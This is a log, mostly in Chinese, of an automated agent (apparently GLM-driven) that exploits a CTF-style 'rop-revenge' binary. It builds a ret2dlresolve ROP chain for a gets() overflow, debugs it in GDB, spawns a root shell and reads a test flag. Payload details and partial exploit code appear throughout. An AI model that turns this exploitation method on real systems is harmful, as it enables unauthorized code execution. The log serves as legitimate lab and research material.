14:30:17 [exploit] ← GLM(50.9s): 调工具[execute]
14:30:17 [exploit] 有趣！在 `vuln` 的 `ret` (0x401238) 处，`close@GOT` = 0x7ffff7eb9810 (close)，`gets@GOT` = 0x7ffff7e2a160 (gets)。两者都仍然是原始的 libc 地址——部分覆盖尚未发生，因为 ROP 链还没有执行（我们正
14:30:17 [exploit]   → 工具 execute({"command": "python3 -c \"from pwn import *; help(Ret2dlresolve)\" 2>&1 | head -40"})
14:30:17 [exploit]   ← execute(0.0s): 【已被工具层拦截】禁止用 execute 跑内联 `python -c` 里的 pwntools 交互（recv 无 timeout → stdin 死锁 → 烧墙钟）。改用：① run_binary(stdin=, timeout=10)；② write_file 完整脚本（内部 recv 必带 ...(189 chars)
14:30:17 [exploit] → 调用 GLM...
14:30:26 [exploit] ← GLM(9.0s): 调工具[write_file]
14:30:26 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\ncontext.arch = 'amd64'\ncontext.log_level = 'error'\n\nBINARY = '/work/workspace/0025-2023-52-)
14:30:26 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve.py
14:30:26 [exploit] → 调用 GLM...
14:30:30 [exploit] ← GLM(3.9s): 调工具[run_script]
14:30:30 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve.py", "timeout": 10})
14:30:31 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ PIE: False ⏎ RELRO: Partial ⏎ PLT: {'chall.c': 4198572, 'alarm': 4198516, 'close': 4198532, 'gets': 4198548, 'set...(493 chars)
14:30:31 [exploit] → 调用 GLM...
14:31:27 [exploit] ← GLM(56.1s): 调工具[write_file]
14:31:27 [exploit] 太好了！ret2dlresolve 是可行的。No PIE，Partial RELRO，并且我拥有所需的所有 section。让我使用 pwntools 的 `Ret2dlresolve` 辅助工具。但这里有一个复杂的情况：stdout/stderr 被关闭了，所以即使我调用了 `system("/
14:31:27 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nExploit for 2023-52-rop-revenge\nUses ret2dlresolve to call system() without libc leak.\nstdout/stderr ar)
14:31:27 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py
14:31:27 [exploit] → 调用 GLM...
14:31:29 [exploit] ← GLM(2.3s): 调工具[run_script]
14:31:29 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py", "timeout": 30})
14:31:29 [exploit]   ← run_script(0.2s): rc=1 ⏎ --- stdout (summarized) --- ⏎ [+] Starting local process '/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target': pid 69388 ⏎ [*] Sto...(766 chars)
14:31:29 [exploit] → 调用 GLM...
14:31:32 [exploit] ← GLM(2.9s): 调工具[execute]
14:31:32 [exploit] `Ret2dlresolve` 没有被直接导入。让我来修复一下导入：
14:31:32 [exploit]   → 工具 execute({"command": "python3 -c \"from pwn import *; print(dir())\" 2>&1 | tr ',' '\\n' | grep -i dlresolve"})
14:31:32 [exploit]   ← execute(0.0s): 【已被工具层拦截】禁止用 execute 跑内联 `python -c` 里的 pwntools 交互（recv 无 timeout → stdin 死锁 → 烧墙钟）。改用：① run_binary(stdin=, timeout=10)；② write_file 完整脚本（内部 recv 必带 ...(189 chars)
14:31:32 [exploit] → 调用 GLM...
14:31:38 [exploit] ← GLM(5.7s): 调工具[write_file]
14:31:38 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\ncontext.log_level='error'\n# Check how to import Ret2dlresolve\ntry:\n    from pwnlib.rop.ret2)
14:31:38 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_import.py
14:31:38 [exploit] → 调用 GLM...
14:31:40 [exploit] ← GLM(2.5s): 调工具[run_script]
14:31:40 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_import.py", "timeout": 10})
14:31:40 [exploit]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ Not found directly ⏎ ['commandline']
14:31:40 [exploit] → 调用 GLM...
14:31:48 [exploit] ← GLM(7.2s): 调工具[write_file]
14:31:48 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\ncontext.log_level='error'\n# Check available rop classes\nimport pwnlib.rop\nprint([x for x in)
14:31:48 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_import2.py
14:31:48 [exploit] → 调用 GLM...
14:31:50 [exploit] ← GLM(2.6s): 调工具[run_script]
14:31:50 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_import2.py", "timeout": 10})
14:31:50 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ['ret2dlresolve'] ⏎ ['resolve', 'ret2dlresolve', 'unresolve'] ⏎ Ret2dlresolvePayload found ⏎ Ret2dlresolve: canno...(281 chars)
14:31:50 [exploit] → 调用 GLM...
14:31:58 [exploit] ← GLM(7.8s): 调工具[write_file]
14:31:58 [exploit] 好的，`Ret2dlresolvePayload` 可用，并且 `rop.ret2dlresolve()` 是一个方法。让我检查一下如何正确使用它：
14:31:58 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nfrom pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload\ncontext.log_level='error'\n\nBINARY)
14:31:58 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve2.py
14:31:58 [exploit] → 调用 GLM...
14:32:02 [exploit] ← GLM(3.9s): 调工具[run_script]
14:32:02 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve2.py", "timeout": 10})
14:32:02 [exploit]   ← run_script(0.2s): rc=1 ⏎ --- stdout (summarized) --- ⏎ data_addr: 0x404e00 ⏎ reloc_index: 0x4848 ⏎ payload len: 58 ⏎ payload hex: 73797374656d00616361616164616161404900...(584 chars)
14:32:02 [exploit] → 调用 GLM...
14:32:11 [exploit] ← GLM(8.6s): 调工具[write_file]
14:32:11 [exploit] ROP 构建返回了一个 `DescriptiveStack` 对象。让我修复一下：
14:32:11 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nfrom pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload\ncontext.log_level='error'\n\nBINARY)
14:32:11 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve3.py
14:32:11 [exploit] → 调用 GLM...
14:32:13 [exploit] ← GLM(2.4s): 调工具[run_script]
14:32:13 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve3.py", "timeout": 10})
14:32:14 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ data_addr: 0x404e00 ⏎ reloc_index: 0x4848 ⏎ payload len: 58 ⏎ payload hex: 73797374656d00616361616164616161404900...(421 chars)
14:32:14 [exploit] → 调用 GLM...
14:32:43 [exploit] ← GLM(29.9s): 调工具[write_file]
14:32:43 [exploit] 我明白了 ROP 链。让我解析一下： - offset 0: 0x401020 (PLT0 - 解析器) 后面跟着 0x4848 (重定位索引) - offset 8: 0x4012c3 (pop rdi; ret) 后面跟着 0x404e28 (参数字符串地址)  等等，这看起来不对。让我重新检查
14:32:43 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nfrom pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload\ncontext.log_level='error'\n\nBINARY)
14:32:44 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve4.py
14:32:44 [exploit] → 调用 GLM...
14:32:47 [exploit] ← GLM(3.9s): 调工具[run_script]
14:32:47 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve4.py", "timeout": 10})
14:32:48 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ data_addr: 0x404e00 ⏎ reloc_index: 18504 ⏎ ROP dump: ⏎ 0x0000:         0x401020 [plt_init] system(0x404e28) ⏎ 0x0...(384 chars)
14:32:48 [exploit] → 调用 GLM...
14:32:57 [exploit] ← GLM(9.5s): 调工具[write_file]
14:32:57 [exploit] 我明白了！ROP dump 显示偏移量是以 4 字节为单位的（0x0000, 0x0004, 0x0008, 0x000c）。这意味着 pwntools 将此视为 32 位二进制文件！偏移量 0x0000 = PLT0 (0x401020, 4 字节)，偏移量 0x0004 = 重定位索引 (0x4
14:32:57 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nfrom pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload\ncontext.arch = 'amd64'\ncontext.log)
14:32:57 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve5.py
14:32:57 [exploit] → 调用 GLM...
14:33:01 [exploit] ← GLM(3.9s): 调工具[run_script]
14:33:01 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve5.py"})
14:33:01 [exploit]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ELF arch: amd64, bits: 64 ⏎ data_addr: 0x404e00 ⏎ reloc_index: 772 ⏎ payload len: 98 ⏎ ROP dump: ⏎ 0x0000:       ...(446 chars)
14:33:01 [exploit] → 调用 GLM...
14:33:28 [exploit] ← GLM(26.5s): 调工具[write_file]
14:33:28 [exploit] 现在这是一个 64 位的 ROP 链： 1. `pop rdi; ret` (0x4012c3) — 设置 rdi = 参数地址 2. 0x404e50 — 参数字符串地址 3. 0x401020 — PLT0 (解析器) 4. 0x304 — 重定位索引  所以流程是： 1. `pop rdi; 
14:33:28 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\nfrom pwn import *\nfrom pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload\ncontext.arch = 'amd64'\ncontext.log)
14:33:28 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve6.py
14:33:28 [exploit] → 调用 GLM...
14:33:31 [exploit] ← GLM(3.6s): 调工具[run_script]
14:33:31 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_dlresolve6.py", "timeout": 10})
14:33:32 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ payload len: 98 ⏎ payload hex: 73797374656d006163616161646161614049000000000000000000000000000000000000000000006b...(666 chars)
14:33:32 [exploit] → 调用 GLM...
14:33:53 [exploit] ← GLM(21.7s): 调工具[write_file]
14:33:53 [exploit] Payload 中没有换行符 (0x0a) —— 这很好。`gets` 会读取直到遇到换行符，因此 NUL 字节是没有问题的（`gets` 不会在 NUL 处停止）。Payload 和 ROP chain 中都没有 0x0a 字节。  现在让我来编写完整的 exploit。计划如下： 1. 溢出 →
14:33:53 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS4 Exploit for rop-revenge (BUG-001: gets() stack buffer overflow)\n\nRoute: ret2dlresolve (No PIE + Part)
14:33:53 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py
14:33:53 [exploit] → 调用 GLM...
14:33:58 [exploit] ← GLM(4.3s): 调工具[run_script]
14:33:58 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py", "timeout": 30})
14:33:58 [exploit]   ← run_script(0.7s): rc=1 ⏎ --- stdout (summarized) --- ⏎ === EXPLOIT FAILED ===
14:33:58 [exploit] → 调用 GLM...
14:34:10 [exploit] ← GLM(11.2s): 调工具[gdb_run]
14:34:10 [exploit] 利用失败。让我使用 GDB 调试一下，看看 ROP chain 在哪里崩溃：
14:34:10 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "b *0x401238; run; info registers rsp rbp rip; x/20gx $rsp; )
14:34:10 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x401238 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(1018 chars)
14:34:10 [exploit] → 调用 GLM...
14:34:21 [exploit] ← GLM(11.1s): 调工具[write_file]
14:34:21 [exploit] 我明白了问题所在——`gdb_run` 的 `stdin` 参数将 `\xHH` 序列视为字面文本，而不是字节。栈中包含了 ASCII 字符串 `\x41\x41...`，而不是原始字节。`gdb_run` 工具的 `stdin` 参数处理转义的方式可能有所不同。  让我改用 payload 文件的
14:34:21 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"Generate payload file for GDB testing\"\"\"\nfrom pwn import *\nfrom pwnlib.rop.ret2dlresolve import Ret2dl)
14:34:21 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/gen_payload.py
14:34:21 [exploit] → 调用 GLM...
14:34:25 [exploit] ← GLM(4.2s): 调工具[run_script]
14:34:25 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/gen_payload.py", "timeout": 10})
14:34:25 [exploit]   ← run_script(0.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ Stage 1 len: 176 ⏎ Stage 2 len: 98 ⏎ Total: 276 ⏎ data_addr: 0x404e00 ⏎ reloc_index: 0x304
14:34:25 [exploit] → 调用 GLM...
14:34:28 [exploit] ← GLM(3.2s): 调工具[gdb_run_crash]
14:34:28 [exploit]   → 工具 gdb_run_crash({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "payload_file": "/work/workspace/0025-2023-52-rop-revenge-20260909-14065)
14:34:29 [exploit]   ← gdb_run_crash(0.1s): {"signal": "SIGSEGV", "crash_addr": "0x00007ffff7dfb43b", "crash_loc": "Segmentation fault.", "raw_tail": "ffffe798:\t0x00007ffff7f6e42c\t0x0000000000...(421 chars)
14:34:29 [exploit] → 调用 GLM...
14:34:35 [exploit] ← GLM(6.1s): 调工具[gdb_run]
14:34:35 [exploit] 崩溃发生在 libc 中的 `0x00007ffff7dfb43b`。这很可能是在 `_dl_runtime_resolve` 或 `system` 内部。崩溃地址在 libc 中，这意味着 `dlresolve` 被触发了，但出了些问题。让我获取更多细节：
14:34:35 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "set pagination off; b *0x401238; run < /work/workspace/0025)
14:34:35 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x401238 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(1970 chars)
14:34:35 [exploit] → 调用 GLM...
14:34:42 [exploit] ← GLM(7.4s): 调工具[gdb_run]
14:34:42 [exploit] 很好！ROP 链执行正常： 1. `pop rdi; ret` → rdi = 0x404e00 (data_addr) 2. `gets@plt` → gets(0x404e00) — 读取 dlresolve payload  gets 正在执行。让我继续单步执行，看看 gets 返回后会发生什
14:34:42 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "set pagination off; b *0x401238; run < /work/workspace/0025)
14:34:42 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x401238 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(1545 chars)
14:34:42 [exploit] → 调用 GLM...
14:34:52 [exploit] ← GLM(9.9s): 调工具[gdb_run]
14:34:52 [exploit] 我明白了——`gets` 正在执行，但 GDB 的 `si` 命令正在单步执行 `gets` 的内部实现。让我换一种方法——在 `gets` 返回后设置断点（在 `gets` 调用之后的 ROP gadget 处）：
14:34:52 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "set pagination off; b *0x4012c3; run < /work/workspace/0025)
14:34:52 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012c3 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(1581 chars)
14:34:52 [exploit] → 调用 GLM...
14:35:06 [exploit] ← GLM(13.4s): 调工具[execute]
14:35:06 [exploit] 我明白了问题所在！在 `gets(data_addr)` 之后，`data_addr` (0x404e00) 处全是零！`gets` 没有写入 `dlresolve` payload。这是因为 `gets` 从 stdin 读取，但 stdin 是 payload 文件。第一个 `gets`（在 `
14:35:06 [exploit]   → 工具 execute({"command": "xxd /work/workspace/0025-2023-52-rop-revenge-20260909-140653/payload_gdb.bin | head -20; echo \"---\"; wc -c /work/workspace/0025-2023-52)
14:35:06 [exploit]   ← execute(0.0s): 00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA ⏎ 00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA ⏎ 00000020: ...(1372 chars)
14:35:06 [exploit] → 调用 GLM...
14:35:22 [exploit] ← GLM(16.1s): 调工具[gdb_run]
14:35:22 [exploit] 我明白了问题所在！payload 文件在偏移量 0xb0 处包含 `0a`（换行符），这是第一个 payload（stage1）的结束符。然后 stage2 从 0xb1 开始。但 stage2 payload 在偏移量 0xb1 处包含 `00`（NUL 字节）——等等，不对。让我仔细看看：  偏
14:35:22 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "set pagination off; b *0x4012c3; run < /work/workspace/0025)
14:35:22 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012c3 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(1628 chars)
14:35:22 [exploit] → 调用 GLM...
14:35:36 [exploit] ← GLM(13.8s): 调工具[gdb_run]
14:35:36 [exploit] 现在我看到 `data_addr` (0x404e00) 已经被写入了！dlresolve payload 已经就位。第三次命中是第二个 `pop rdi; ret`（用于 dlresolve），此时 rdi = 0x7ffff7fa8720（这是 gets 的返回值，而不是 data_addr）。
14:35:36 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "set pagination off; b *0x401020; run < /work/workspace/0025)
14:35:36 [exploit]   ← gdb_run(0.1s): Breakpoint 1 at 0x401020 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(1329 chars)
14:35:36 [exploit] → 调用 GLM...
14:35:44 [exploit] ← GLM(7.8s): 调工具[gdb_run]
14:35:44 [exploit] 我明白了！PLT0 处的断点在 `init()` 期间（调用 `alarm@plt`）首先被触发。第一次命中是 `init` 中的 `alarm(60)` 调用。`continue` 会到达第二次命中，这应该是 ROP 链对 PLT0 的调用。  但等等——在 `continue` 之后，它再次命中
14:35:44 [exploit]   → 工具 gdb_run({"binary": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target", "commands": "set pagination off; run < /work/workspace/0025-2023-52-rop-)
14:35:44 [exploit]   ← gdb_run(0.1s): [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎  ⏎ Program received signa...(782 chars)
14:35:44 [exploit] → 调用 GLM...
14:35:52 [exploit] ← GLM(7.8s): 调工具[execute]
14:35:52 [exploit] 崩溃发生在 libc 的 `0x7ffff7dfb43b` 处。rsi = `0x7ffff7f6e42f` —— 这看起来像是一个 libc 地址。让我检查一下这个地址是什么：
14:35:52 [exploit]   → 工具 execute({"command": "python3 -c \"\n# Check what's at the crash address in libc\n# libc base from the GDB run: need to figure it out\n# rsi = 0x7ffff7f6e42f\n)
14:35:52 [exploit]   ← execute(0.0s): Possible libc base: 0x7ffff7da3000 ⏎ Check: base + 0x1cb42f = 0x7ffff7f6e42f ⏎ rsi = 0x7ffff7f6e42f ⏎ system would be at: 0x7ffff7dfb750 ⏎ crash at: 0...(239 chars)
14:35:52 [exploit] → 调用 GLM...
14:35:57 [exploit] ← GLM(5.6s): 调工具[execute]
14:35:57 [exploit] 有趣！rsi = libc base + 0x1cb42f = `/bin/sh` 字符串地址。崩溃地址 = libc base + 0x5843b。`system` 位于 libc base + 0x58750。因此，崩溃发生在 `system` 之前（偏移量 0x5843b < 0x58750）
14:35:57 [exploit]   → 工具 execute({"command": "objdump -d /lib/x86_64-linux-gnu/libc.so.6 --start-address=0x58430 --stop-address=0x58450 2>/dev/null | head -20"})
14:35:57 [exploit]   ← execute(0.0s):  ⏎ /lib/x86_64-linux-gnu/libc.so.6:     file format elf64-x86-64 ⏎  ⏎  ⏎ Disassembly of section .text: ⏎  ⏎ 0000000000058430 <swapcontext@@GLIBC_2.2.5...(647 chars)
14:35:57 [exploit] → 调用 GLM...
14:36:04 [exploit] ← GLM(6.8s): 调工具[write_file]
14:36:04 [exploit] 崩溃发生在 `movaps %xmm0, 0x50(%rsp)` 处——这是一个栈对齐问题！`movaps` 要求 RSP 是 16 字节对齐的。崩溃意味着在 `system` 内部调用时，RSP 没有进行 16 字节对齐。  这是经典的 x86-64 栈对齐问题。我需要在调用 `system` 之
14:36:04 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env pytho...(argument truncated)", "file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py"})
14:36:04 [exploit]   ← write_file(0.0s): 【写入被拦截】内容以 '(argument truncated)' 结尾——工具调用参数被截断，写入半截文件会毁掉磁盘上的完整版本。请重发完整的 write_file（较长时分两次：先写前半，再 edit_file 追加后半）。
14:36:04 [exploit] → 调用 GLM...
14:36:20 [exploit] ← GLM(15.8s): 调工具[write_file]
14:36:20 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS4 Exploit: ret2dlresolve to call system(\"/bin/sh 1>&0 2>&0\")\nTarget: rop-revenge (gets overflow, clos)
14:36:20 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py
14:36:20 [exploit] → 调用 GLM...
14:36:33 [exploit] ← GLM(13.0s): 调工具[run_script]
14:36:33 [exploit]   → 工具 run_script({"path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py", "timeout": 30})
14:36:40 [exploit]   ← run_script(6.8s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎ id output: b'uid=0(root) gid=0(root) groups=0(root)\n# ' ⏎ LEANAGENT_SUCCESS ⏎ --- rest --...(3212 chars)
14:36:40 [exploit] → 调用 GLM...
14:36:46 [exploit] ← GLM(6.5s): 调工具[execute]
14:36:46 [exploit] 漏洞利用成功！我们获得了 root shell (`uid=0(root)`) 并读取了 flag 文件 (`flag.txt` → `test_flag_content_here`)。漏洞利用通过 `ret2dlresolve` 调用 `system("/bin/sh 1>&0 2>&0")`，将
14:36:46 [exploit]   → 工具 execute({"command": "rm -f /work/workspace/0025-2023-52-rop-revenge-20260909-140653/debug*.py /work/workspace/0025-2023-52-rop-revenge-20260909-140653/check_*)
14:36:46 [exploit]   ← execute(0.0s): <no output> ⏎ [Command succeeded with exit code 0]
14:36:46 [exploit] → 调用 GLM...
14:36:51 [exploit] ← GLM(5.3s): 调工具[read_file]
14:36:51 [exploit] 现在让我读取最终的 exploit.py 以包含在报告中：
14:36:51 [exploit]   → 工具 read_file({"file_path": "/work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py"})
14:36:51 [exploit]   ← read_file(0.0s):  1  #!/usr/bin/env python3 ⏎  2  """ ⏎  3  S4 Exploit: ret2dlresolve to call system("/bin/sh 1>&0 2>&0") ⏎  4  Target: rop-revenge (gets overflow, clo...(3923 chars)
14:36:51 [exploit] → 调用 GLM...
14:37:44 [exploit] ← GLM(52.2s): 调工具[submit_final_result]
14:37:44 [exploit] 漏洞利用已验证并运行成功。现在让我提交最终报告：
14:37:44 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，10569 chars）
14:37:44 [exploit] → 调用 GLM...
14:37:52 [exploit] ← GLM(8.3s)
14:37:52 [exploit] 漏洞利用已成功提交。以下是所完成工作的总结：  **目标**：rop-revenge 二进制文件（通过 `gets()` 导致栈溢出，在返回前调用 `close(1)`/`close(2)`，无 PIE，部分 RELRO，开启 NX，glibc 2.39）  **关键挑战**：`close(1)` 
14:37:52 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
14:37:52 [stage4] 保存 → /work/workspace/0025-2023-52-rop-revenge-20260909-140653/stage4.json
14:38:15 📄 渗透报告：/work/workspace/0025-2023-52-rop-revenge-20260909-140653/report.md
=== 主 agent 汇总 ===
分析完成！结果如下：

## 漏洞分析结果

| 项目 | 结果 |
|------|------|
| **二进制路径** | `/work/workspace/0025-2023-52-rop-revenge-20260909-140653/target` |
| **Exploit 是否成功** | ✅ **成功** |
| **Exploit 脚本路径** | `/work/workspace/0025-2023-52-rop-revenge-20260909-140653/exploit.py` |
| **完整报告路径** | `/work/workspace/0025-2023-52-rop-revenge-20260909-140653/report.md` |
| **Workspace 目录** | `/work/workspace/0025-2023-52-rop-revenge-20260909-140653/` |

### 概述

针对目标二进制 `./target` 的完整 S1-S4 漏洞分析已跑通，exploit 成功触发。从 workspace 命名（`rop-revenge`）来看，该二进制涉及 **ROP（Return-Oriented Programming）** 相关漏洞，分析流程已自动完成：

- **S1 侦察**：二进制信息收集与保护机制检测
- **S2 语义**：漏洞点定位与语义分析
- **S3 原语验证**：漏洞原语验证
- **S4 Exploit**：最终 exploit 构建并成功利用

所有产物（stage1-4.json、exploit.py、report.md、full_run.log）均保存在 workspace 目录下，可进一步查看 `report.md` 获取详细分析报告。
